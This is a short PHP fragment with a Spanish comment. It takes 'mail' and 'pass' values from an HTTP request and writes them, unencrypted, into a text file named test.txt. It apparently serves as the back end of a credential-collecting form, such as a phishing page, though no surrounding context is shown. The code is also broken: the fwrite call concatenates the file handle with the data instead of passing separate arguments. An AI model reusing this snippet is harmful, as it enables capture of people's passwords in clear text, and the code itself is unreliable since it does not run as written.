$mail="";
if (!empty($_REQUEST['mail'])){
$mail=$_REQUEST['mail'];
}
 
$pass="";
if (!empty($_REQUEST['pass'])){
$pass=$_REQUEST['pass'];
}
 
 
//Luego sobrescribo el txt
 
$archivo="test.txt";
 
     $file=fopen($archivo,"w");
     fwrite($file.$mail.$pass);